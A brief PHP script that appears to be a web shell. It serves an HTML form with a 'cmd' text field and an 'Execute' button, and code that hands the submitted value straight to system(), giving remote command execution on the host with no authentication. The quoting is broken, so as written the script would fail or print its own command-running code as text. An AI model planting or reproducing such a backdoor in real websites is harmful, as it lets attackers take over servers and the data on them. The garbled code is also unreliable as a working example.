#! /usr/bin/php

<?php

echo '
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
if(isset($_GET['cmd']))
{
    system($_GET['cmd']);
}
</pre>
</body>
</html>
'
?>